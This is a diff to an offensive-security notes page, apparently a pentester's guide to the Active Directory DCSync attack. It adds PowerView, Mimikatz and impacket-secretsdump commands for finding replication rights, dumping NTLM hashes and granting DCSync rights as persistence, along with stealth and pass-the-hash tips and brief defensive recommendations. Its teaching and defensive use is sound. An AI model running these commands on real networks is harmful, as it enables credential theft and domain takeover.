@@ -21,16 +21,46 @@ permalink: /ad/dcsynk/
 
 - Domain account with *Replicating Directory Changes*, *Replicating Directory Changes All*, and Re*plicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned.
 
+## Vulnerability
+
+A user who has domain permissions listed above can act like a Domain Controller and ask another Domain Controller to replicate Active Directory objects. It will use MS-DRSR protocol which can not be disabled. Therefore, if you manage to compromise such an account, you'll be able to retrieve NTLM hash of any domain account.
+
 ## Exploit
 
-To obtain the NTLM hash of a single targeted user using a DCSync attack. You can also get the entire NTDS.dit, but it's less stealthy.
+If you already compromised an initial low privileged account, you can enumerate domain users which can perform DCSync attacks by using `BloodHound` or with following commands.
+
+```bash
+# With PowerView from a domain joined computer.
+Get-ObjectAcl -DistinguishedName "dc=$company,dc=$com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+```
+
+To obtain the NTLM hash of a single targeted user using a DCSync attack, use commands below.
 
 ```bash
 # From a domain joined Windows computer, with Mimikatz
-lsadump::dcsync /user:$DOMAIN\$TARGET
+lsadump::dcsync /user:$domain\$TARGET
 
 # From Kali
-impacket-secretsdump -just-dc-user $TARGET $DOMAIN/$USERNAME:$PASSWORD@$DC_IP
+impacket-secretsdump -just-dc-user $target $domain/$username:$password@$dc_ip
 ```
 
-Once you get the NTLM hash of your target user, you can user `hashcat -m 1000` to crack it.
+{: .warning }
+> You can also dump the entire NTDS.dit, but it's less stealthy.
+
+Once you get the NTLM hash of your target user, you can:
+* Crack it using `hashcat -m 1000`.
+* Perform Pass-the-Hash.
+
+## Persistence
+
+If you are Domain Administrator, you can grant any domain user DCSync rights.
+
+```bash
+# From a domain joined computer with PowerView.
+Add-ObjectAcl -TargetDistinguishedName "dc=$company,dc=$com" -PrincipalSamAccountName $username -Rights DCSync -Verbose
+```
+
+## Recommendations
+
+- [ ] Disable *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights for domain users who don't need them.
+- [ ] Enforce EDR on Domain Controllers to detect and block DCSync attacks.
